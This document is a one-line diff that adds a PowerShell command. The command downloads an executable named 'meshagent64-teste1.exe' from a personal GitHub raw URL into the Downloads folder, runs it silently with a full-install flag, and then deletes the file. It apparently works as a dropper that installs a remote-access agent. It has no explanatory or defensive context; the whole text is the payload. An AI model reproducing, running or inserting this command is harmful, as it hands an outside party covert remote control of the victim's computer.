@@ -1,0 +1,1 @@
+$d=(New-Object -ComObject Shell.Application).Namespace("shell:Downloads").Self.Path;$f="$d\\meshagent64-teste1.exe";iwr https://raw.githubusercontent.com/darkcat888/testeMSC/refs/heads/main/meshagent64-teste1.exe -OutFile $f;$p=Start-Process $f -ArgumentList "-fullinstall" -PassThru;$p.WaitForExit();Remove-Item $f;exit
